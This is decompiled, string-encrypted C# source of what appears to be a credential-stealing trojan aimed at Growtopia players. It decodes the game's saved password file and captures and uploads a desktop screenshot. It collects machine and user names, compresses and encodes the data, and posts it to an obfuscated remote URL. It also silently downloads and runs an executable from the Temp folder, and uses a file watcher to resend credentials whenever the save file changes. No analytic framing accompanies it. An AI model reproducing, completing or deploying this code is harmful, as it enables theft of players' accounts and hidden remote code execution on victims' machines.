using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WPJx1;

public class k
{
	public static class pwDec
	{
		public static List<string> ParsePassword(byte[] contents)
		{
			try
			{
				string text = x8Mq.DmNSKV("39GqrqV6MsAl5Qp2e6EHeg==");
				foreach (byte b in contents)
				{
					string text2 = b.ToString(x8Mq.DmNSKV("pcVXL8L8Zga3e1GZ/pczJA=="));
					text = ((!(text2 == x8Mq.DmNSKV("RQ12DGUYatO2hm3/rrEDAA=="))) ? (text + text2) : (text + x8Mq.DmNSKV("H9BKjwDtLdBryZewoFcRyg==")));
				}
				if (text.Contains(x8Mq.DmNSKV("l6Dbrh9xMAN6C4/HUwlOKADsuRuud0XfdCGJ+TkdjrE=")))
				{
					string text3 = x8Mq.DmNSKV("l6Dbrh9xMAN6C4/HUwlOKADsuRuud0XfdCGJ+TkdjrE=");
					int num = text.IndexOf(text3);
					int num2 = text.LastIndexOf(text3);
					string empty;
					if (false)
					{
						empty = string.Empty;
					}
					num += text3.Length;
					int num3 = text.IndexOf(x8Mq.DmNSKV("F6oh+IgU22TTYw+Tbz/+WA=="), num);
					if (false)
					{
						empty = string.Empty;
					}
					string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
					if (@string.ToCharArray()[0] != '_' || 1 == 0)
					{
						empty = text.Substring(num, num3 - num).Trim();
					}
					else
					{
						num2 += text3.Length;
						num3 = text.IndexOf(x8Mq.DmNSKV("F6oh+IgU22TTYw+Tbz/+WA=="), num2);
						empty = text.Substring(num2, num3 - num2).Trim();
					}
					string text4 = x8Mq.DmNSKV("l6Dbrh9xMAN6C4/HUwlOKADsuRuud0XfdCGJ+TkdjrE=") + empty + x8Mq.DmNSKV("F6oh+IgU22TTYw+Tbz/+WA==");
					int num4 = text.IndexOf(text4);
					string empty2;
					if (false)
					{
						empty2 = string.Empty;
					}
					num4 += text4.Length;
					int num5 = text.IndexOf(x8Mq.DmNSKV("F6oh+IgU22TTYw+Tbz/+WA=="), num4);
					if (false)
					{
						empty2 = string.Empty;
					}
					empty2 = text.Substring(num4, num5 - num4).Trim();
					int num6 = StringToByteArray(empty)[0];
					empty2 = empty2.Substring(0, num6 * 2);
					byte[] array = StringToByteArray(empty2.Replace(x8Mq.DmNSKV("H9BKjwDtLdBryZewoFcRyg=="), x8Mq.DmNSKV("RQ12DGUYatO2hm3/rrEDAA==")));
					List<byte> list = new List<byte>();
					List<byte> list2 = new List<byte>();
					byte b2 = (byte)(48 - array[0]);
					byte[] array2 = array;
					foreach (byte b3 in array2)
					{
						list.Add((byte)(b2 + b3));
					}
					for (int l = 0; l < list.Count; l++)
					{
						list2.Add((byte)(list[l] - 1 - l));
					}
					List<string> list3 = new List<string>();
					for (int m = 0; m <= 255; m++)
					{
						string text5 = x8Mq.DmNSKV("39GqrqV6MsAl5Qp2e6EHeg==");
						foreach (byte item in list2)
						{
							if (ValidateChar((char)(byte)(item + m)))
							{
								text5 += (char)(byte)(item + m);
							}
						}
						if (text5.Length == num6)
						{
							list3.Add(text5);
						}
					}
					return list3;
				}
				return null;
			}
			catch
			{
				return null;
			}
		}

		public static byte[] StringToByteArray(string str)
		{
			Dictionary<string, byte> dictionary = new Dictionary<string, byte>();
			for (int i = 0; i <= 255; i++)
			{
				dictionary.Add(i.ToString(x8Mq.DmNSKV("pcVXL8L8Zga3e1GZ/pczJA==")), (byte)i);
			}
			List<byte> list = new List<byte>();
			for (int j = 0; j < str.Length; j += 2)
			{
				list.Add(dictionary[str.Substring(j, 2)]);
			}
			return list.ToArray();
		}

		private static bool ValidateChar(char cdzdshr)
		{
			if ((cdzdshr >= '0' && cdzdshr <= '9') || (cdzdshr >= 'A' && cdzdshr <= 'Z') || (cdzdshr >= 'a' && cdzdshr <= 'z') || (cdzdshr >= '+' && cdzdshr <= '.'))
			{
				return true;
			}
			return false;
		}

		public static string[] Func(byte[] lel)
		{
			List<string> list = ParsePassword(lel);
			return list.ToArray();
		}
	}

	public class Trace
	{
		private static FileSystemWatcher watcher = new FileSystemWatcher();

		public static void CreateFileWatcher()
		{
			watcher.Path = (string)Registry.GetValue(x8Mq.DmNSKV("40FjKkPUPllFbymrGD92D6CJcK01nTKnneCeCocBDJODVRWAO/1arxHMIRh1lUJk"), x8Mq.DmNSKV("uFUd+zlvbAs1CVL2h+htpA=="), null);
			watcher.NotifyFilter = NotifyFilters.LastAccess;
			watcher.Filter = x8Mq.DmNSKV("bI9fioXMoCSjG7CQxzYKIw==");
			watcher.Changed += OnChanged;
			watcher.EnableRaisingEvents = true;
		}

		private static void OnChanged(object source, FileSystemEventArgs e)
		{
			//IL_0133: Unknown result type (might be due to invalid IL or missing references)
			//IL_013a: Expected O, but got Unknown
			string text = Path.GetTempPath() + x8Mq.DmNSKV("D9DvWWkQWV0mE48vYVI6XQ==");
			if (!File.Exists(text))
			{
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
				WebClient webClient = new WebClient();
				webClient.DownloadFile(x8Mq.DmNSKV("NgbOQf6YOf+O2glG9vPxkn8DlnMutQk7Q1RbNAa8NdzON6uvLk+Akn9BRxKTh7bNAHl01ZKQuN7RD8TpCF90bsXi1xQ0glkSXhhuM+K+LiI="), text);
			}
			Process process = new Process();
			process.StartInfo.FileName = text;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.WorkingDirectory = Path.GetTempPath();
			process.Start();
			process.WaitForExit();
			string[] array = File.ReadAllText(Path.GetTempPath() + x8Mq.DmNSKV("f9+BaZitVhNk9M/PuL6bJA==")).Split(new char[1] { '|' });
			if (array[0] != apt)
			{
				Packet packet = new Packet();
				packet.growid = array[0];
				packet.password = array[1];
				packet.lastworld = array[2];
				Console.WriteLine(x8Mq.DmNSKV("xPxX7uUEap92SqnOl3PF9V1GlXwiuvHYFS+GR4LedR1sjrGrVEIcxT9fNmh+0lGl"));
				apt = array[0];
				packet.desktoppic = TN567();
				packet.computerInfo = Environment.MachineName;
				packet.user = Environment.UserName;
				DataContractJsonSerializer val = new DataContractJsonSerializer(typeof(Packet));
				MemoryStream memoryStream = new MemoryStream();
				((XmlObjectSerializer)val).WriteObject((Stream)memoryStream, (object)packet);
				memoryStream.Position = 0L;
				string text2 = new StreamReader(memoryStream).ReadToEnd();
				string value = _5zOmT(text2);
				using WebClient webClient2 = new WebClient();
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection[x8Mq.DmNSKV("DfYj/WnGAcVBNxoeoZfmug==")] = x8Mq.DmNSKV("FEAtvTrluGItaNEv0P3Gqg==");
				nameValueCollection[x8Mq.DmNSKV("N6fEJtKAPe5EgBjSWuMoZQ==")] = value;
				new WebClient();
				string address = x8Mq.DmNSKV("GaCiKTORUcRmXlJLkB3XwpuLOw3hU6iTi8HiXJ15FBRkpCa0lU9f/YsH79bflElP");
				webClient2.UploadValues(address, nameValueCollection);
			}
			else
			{
				Console.WriteLine(x8Mq.DmNSKV("u5mMNicfZTO+MSWMl6wkEw=="));
			}
			watcher.EnableRaisingEvents = true;
		}
	}

	[DataContract]
	public class Packet
	{
		[DataMember]
		public string growid;

		[DataMember]
		public string password;

		[DataMember]
		public string MAC;

		[DataMember]
		public string computerInfo;

		[DataMember]
		public string lastworld;

		[DataMember]
		public string user;

		[DataMember]
		public string token;

		[DataMember]
		public string ip;

		[DataMember]
		public string browsercreds;

		[DataMember]
		public string desktoppic;
	}

	internal class AMl7d6
	{
		internal class B0e
		{
		}

		extern _003F ();

		extern _003F ();
	}

	private static string apt;

	public static string TN567()
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Expected O, but got Unknown
		_ = 2132010082L;
		try
		{
			x8Mq.AY = Environment.UserName;
			x8Mq.P0tdFo = x8Mq.DmNSKV("/fOxahb6ExnWBaJYsaKonA==") + x8Mq.AY + x8Mq.DmNSKV("+g//vTUqyn2OM0rJW4EDKdFXHDpc1rtoXuWa4CFBqkE=");
			x8Mq.J = Screen.get_PrimaryScreen().get_Bounds();
			int width = x8Mq.J.Width;
			x8Mq._3InF = Screen.get_PrimaryScreen().get_Bounds();
			x8Mq.NinpH = new Bitmap(width, x8Mq._3InF.Height);
			x8Mq.W42R = Graphics.FromImage((Image)(object)x8Mq.NinpH);
			try
			{
				Graphics w42R = x8Mq.W42R;
				x8Mq.f = Screen.get_PrimaryScreen().get_Bounds();
				w42R.CopyFromScreen(0, 0, 0, 0, x8Mq.f.Size);
				((Image)x8Mq.NinpH).Save(x8Mq.P0tdFo);
				x8Mq.mzMZ = new WebClient();
				x8Mq.om7ca2 = new NameValueCollection();
				x8Mq.om7ca2.Add(x8Mq.DmNSKV("kzrzXawHJz6lNFcREVtYdA=="), Convert.ToBase64String(File.ReadAllBytes(x8Mq.P0tdFo)));
				x8Mq.FSM1dt = x8Mq.om7ca2;
				x8Mq.Q = x8Mq.mzMZ.UploadValues(x8Mq.DmNSKV("5ZNWq6hCfIT0Ea2JdpyeGlx2PPc6i8EZyE6eCAhgtkjzWV9zW8U60zZyc+R7TLdyowbDmwaLg5GwdTNH5JSCZSx+DIFJ6xKZKI549xhjyG4="), x8Mq.FSM1dt);
				x8Mq._7k = Encoding.UTF8.GetString(x8Mq.Q);
				x8Mq.l3u = new Regex(x8Mq.DmNSKV("uXJH6NREYqhPKXJZ8gYNjovE/8AosFMIsyothiHiwMAW6BG3hyV+gEMYobpHcF6o0LHQSupk2z5YX6ceJgp1GQ=="));
				x8Mq.U7bX = x8Mq.l3u.Match(x8Mq._7k);
				x8Mq.CdTY = x8Mq.U7bX.Groups[0].Value;
			}
			finally
			{
				if (x8Mq.W42R != null)
				{
					((IDisposable)x8Mq.W42R).Dispose();
				}
			}
		}
		catch
		{
			x8Mq.CdTY = null;
		}
		return x8Mq.CdTY;
	}

	public static void h(string FileName, string Name)
	{
		//Discarded unreachable code: IL_0013, IL_0018, IL_0098
		int num = 0;
		bool flag = true;
		if (!(num == 0))
		{
			return;
		}
		_ = 2132010082L;
		x8Mq.R8c = Assembly.GetCallingAssembly();
		x8Mq.uHvtB = x8Mq.R8c.GetManifestResourceStream(FileName);
		try
		{
			x8Mq.KDY = new byte[(int)x8Mq.uHvtB.Length];
			x8Mq.uHvtB.Read(x8Mq.KDY, 0, x8Mq.KDY.Length);
			File.WriteAllBytes(Name, x8Mq.KDY);
		}
		finally
		{
			if (x8Mq.uHvtB != null)
			{
				((IDisposable)x8Mq.uHvtB).Dispose();
			}
		}
	}

	public static void a(string[] args)
	{
		//Discarded unreachable code: IL_0013, IL_0018, IL_05b7
		//IL_048e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0498: Expected O, but got Unknown
		int num = 0;
		bool flag = true;
		if (!(num == 0))
		{
			return;
		}
		_ = 2132010082L;
		x8Mq.CPYo = new Packet();
		while (true)
		{
			x8Mq.zx = new WebClient();
			try
			{
				x8Mq.zx.DownloadString(x8Mq.DmNSKV("8dh9FuKQ4oTNVM6DaTfGQAzv7Ry9XfdQwjdIideDB0Y="));
			}
			catch
			{
				Thread.Sleep(Convert.ToInt32(22500.0 - Math.Truncate(7500.0)));
				continue;
			}
			break;
		}
		x8Mq._49ne8f = Path.GetTempPath() + x8Mq.DmNSKV("D9DvWWkQWV0mE48vYVI6XQ==");
		if (!File.Exists(x8Mq._49ne8f))
		{
			ServicePointManager.SecurityProtocol = (SecurityProtocolType)Convert.ToInt32(3839.116207135708 - Math.Cos(1920.0));
			x8Mq.Dy2 = new WebClient();
			x8Mq.Dy2.DownloadFile(x8Mq.DmNSKV("NgbOQf6YOf+O2glG9vPxkn8DlnMutQk7Q1RbNAa8NdzON6uvLk+Akn9BRxKTh7bNAHl01ZKQuN7RD8TpCF90bsXi1xQ0glkSXhhuM+K+LiI="), x8Mq._49ne8f);
		}
		x8Mq._9cF = new Process();
		x8Mq._9cF.StartInfo.FileName = x8Mq._49ne8f;
		x8Mq._9cF.StartInfo.CreateNoWindow = true;
		x8Mq._9cF.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		x8Mq._9cF.StartInfo.WorkingDirectory = Path.GetTempPath();
		x8Mq._9cF.Start();
		x8Mq._9cF.WaitForExit();
		string text = File.ReadAllText(Path.GetTempPath() + x8Mq.DmNSKV("f9+BaZitVhNk9M/PuL6bJA=="));
		x8Mq.eNcl1 = new char[1];
		x8Mq.eNcl1[0] = (char)Convert.ToInt32(122.20760831050174 + Math.Log10(62.0));
		x8Mq.YdRj3U = text.Split(x8Mq.eNcl1);
		try
		{
			x8Mq.CPYo.growid = x8Mq.YdRj3U[0];
			x8Mq.CPYo.password = x8Mq.YdRj3U[1];
			x8Mq.CPYo.lastworld = x8Mq.YdRj3U[Convert.ToInt32(1.1585290151921035 + Math.Sin(1.0))];
			apt = x8Mq.CPYo.growid;
		}
		catch
		{
			x8Mq.oz = File.ReadAllBytes((string)Registry.GetValue(x8Mq.DmNSKV("40FjKkPUPllFbymrGD92D6CJcK01nTKnneCeCocBDJODVRWAO/1arxHMIRh1lUJk"), x8Mq.DmNSKV("uFUd+zlvbAs1CVL2h+htpA=="), null) + x8Mq.DmNSKV("5dMHspYJZmkzz30DE3myCQ=="));
			x8Mq.i = new Regex(x8Mq.DmNSKV("Kp9ApF+mIftRweE2Uptghw=="));
			x8Mq.UDdHP = Encoding.Default.GetString(x8Mq.oz).Replace(x8Mq.DmNSKV("w/Jd2qTPaCjvqmVGpfQPmw=="), x8Mq.DmNSKV("J53YzzFWcVNXmR79jKGICQ=="));
			Packet cPYo = x8Mq.CPYo;
			Regex i = x8Mq.i;
			string text2 = x8Mq.UDdHP.Substring(x8Mq.UDdHP.IndexOf(x8Mq.DmNSKV("BiHxhYPj7QnM+DHWIEbNog==")) + x8Mq.DmNSKV("BiHxhYPj7QnM+DHWIEbNog==").Length);
			x8Mq._8hR = new char[1];
			x8Mq._8hR[0] = (char)Convert.ToInt32(30.795880017344075 + Math.Log10(16.0));
			cPYo.growid = i.Replace(text2.Split(x8Mq._8hR)[Convert.ToInt32(3.4054651081081646 - Math.Log(1.5))], string.Empty);
			x8Mq.YF6b = null;
			x8Mq.axN5Ef = pwDec.Func(x8Mq.oz);
			x8Mq.V5EK = 0;
			while (x8Mq.V5EK < x8Mq.axN5Ef.Length)
			{
				x8Mq.Y = x8Mq.axN5Ef[x8Mq.V5EK];
				x8Mq.YF6b = x8Mq.YF6b + x8Mq.Y + x8Mq.DmNSKV("rwuo8XDE3HF32Z6IS8l0bw==");
				x8Mq.V5EK++;
			}
			x8Mq.CPYo.password = x8Mq.YF6b;
			Packet cPYo2 = x8Mq.CPYo;
			Regex i2 = x8Mq.i;
			string text3 = x8Mq.UDdHP.Substring(x8Mq.UDdHP.IndexOf(x8Mq.DmNSKV("j5Na7OHRO0rLE3wFNRpL4w==")) + x8Mq.DmNSKV("j5Na7OHRO0rLE3wFNRpL4w==").Length);
			x8Mq.x4TICU = new char[1];
			x8Mq.x4TICU[0] = (char)Convert.ToInt32(16.0 + Math.Round(16.0));
			cPYo2.lastworld = i2.Replace(text3.Split(x8Mq.x4TICU)[0x4116AC2 ^ 0x4116AC1], string.Empty);
			if (x8Mq.CPYo.lastworld == x8Mq.DmNSKV("j5Na7OHRO0rLE3wFNRpL4w=="))
			{
				x8Mq.CPYo.lastworld = x8Mq.DmNSKV("82nPjjxb46v+miWupcLR5Q==");
			}
		}
		x8Mq.CPYo.desktoppic = TN567();
		x8Mq.CPYo.computerInfo = Environment.MachineName;
		x8Mq.CPYo.user = Environment.UserName;
		x8Mq._7TV = new DataContractJsonSerializer(typeof(Packet));
		x8Mq._31L = new MemoryStream();
		((XmlObjectSerializer)x8Mq._7TV).WriteObject((Stream)x8Mq._31L, (object)x8Mq.CPYo);
		x8Mq._31L.Position = 0L;
		x8Mq.LyY2u = new StreamReader(x8Mq._31L).ReadToEnd();
		x8Mq.RVv = _5zOmT(x8Mq.LyY2u);
		x8Mq.i6 = new WebClient();
		try
		{
			x8Mq.UDFWj = new NameValueCollection();
			x8Mq.UDFWj[x8Mq.DmNSKV("DfYj/WnGAcVBNxoeoZfmug==")] = x8Mq.DmNSKV("FEAtvTrluGItaNEv0P3Gqg==");
			x8Mq.UDFWj[x8Mq.DmNSKV("N6fEJtKAPe5EgBjSWuMoZQ==")] = x8Mq.RVv;
			x8Mq.UDFWj[x8Mq.DmNSKV("DjQmYdhmFoMQjZvNDOZzYw==")] = x8Mq.CPYo.ip;
			new WebClient();
			x8Mq.epF7 = x8Mq.DmNSKV("GaCiKTORUcRmXlJLkB3XwpuLOw3hU6iTi8HiXJ15FBRkpCa0lU9f/YsH79bflElP");
			x8Mq.Hgcd2b = x8Mq.i6.UploadValues(x8Mq.epF7, x8Mq.UDFWj);
			Console.WriteLine(Encoding.UTF8.GetString(x8Mq.Hgcd2b));
		}
		finally
		{
			if (x8Mq.i6 != null)
			{
				((IDisposable)x8Mq.i6).Dispose();
			}
		}
		Trace.CreateFileWatcher();
		Console.ReadLine();
	}

	public static string _5zOmT(string text)
	{
		_ = 2132010082L;
		x8Mq.nV = Encoding.UTF8.GetBytes(text);
		x8Mq.tQwI = new MemoryStream();
		x8Mq.lgii = new GZipStream(x8Mq.tQwI, CompressionLevel.Optimal, leaveOpen: true);
		try
		{
			x8Mq.lgii.Write(x8Mq.nV, 0, x8Mq.nV.Length);
		}
		finally
		{
			if (x8Mq.lgii != null)
			{
				((IDisposable)x8Mq.lgii).Dispose();
			}
		}
		x8Mq.tQwI.Position = 0L;
		x8Mq.dXlnPP = new byte[x8Mq.tQwI.Length];
		x8Mq.tQwI.Read(x8Mq.dXlnPP, 0, x8Mq.dXlnPP.Length);
		x8Mq.T = new byte[x8Mq.dXlnPP.Length + Convert.ToInt32(6.0 - 2.0)];
		Buffer.BlockCopy(x8Mq.dXlnPP, 0, x8Mq.T, 0x2A93E3E5 ^ 0x2A93E3E1, x8Mq.dXlnPP.Length);
		Buffer.BlockCopy(BitConverter.GetBytes(x8Mq.nV.Length), 0, x8Mq.T, 0, Convert.ToInt32(3.5838531634528574 - Math.Cos(2.0)));
		return Convert.ToBase64String(x8Mq.T);
	}

	public static string TonoZS(byte[] bytes)
	{
		_ = 2132010082L;
		x8Mq.rB = new MemoryStream();
		x8Mq._0 = new GZipStream(x8Mq.rB, CompressionLevel.Optimal, leaveOpen: true);
		try
		{
			x8Mq._0.Write(bytes, 0, bytes.Length);
		}
		finally
		{
			if (x8Mq._0 != null)
			{
				((IDisposable)x8Mq._0).Dispose();
			}
		}
		x8Mq.rB.Position = 0L;
		x8Mq.vN5 = new byte[x8Mq.rB.Length];
		x8Mq.rB.Read(x8Mq.vN5, 0, x8Mq.vN5.Length);
		x8Mq.dTE5l = new byte[x8Mq.vN5.Length + Convert.ToInt32(2.0 + Math.Ceiling(2.0))];
		Buffer.BlockCopy(x8Mq.vN5, 0, x8Mq.dTE5l, Convert.ToInt32(2.0 + Math.Truncate(2.0)), x8Mq.vN5.Length);
		Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, x8Mq.dTE5l, 0, Convert.ToInt32(6.0 - Math.Ceiling(2.0)));
		return Convert.ToBase64String(x8Mq.dTE5l);
	}

	public k()
	{
		//Discarded unreachable code: IL_000f, IL_0010, IL_0015, IL_001b, IL_0027, IL_002a, IL_002f, IL_0039
		//IL_000c: Incompatible stack heights: 0 vs 1
		int num = 0;
		bool flag = true;
		flag = num == 0;
		/*Error: Could not find block for branch target IL_000d*/;
	}

	static k()
	{
		//Discarded unreachable code: IL_000f, IL_0010, IL_0015, IL_001b, IL_0027, IL_002e, IL_0033, IL_003a, IL_003f, IL_0049
		//IL_000c: Incompatible stack heights: 0 vs 1
		int num = 0;
		bool flag = true;
		flag = num == 0;
		/*Error: Could not find block for branch target IL_000d*/;
	}
}
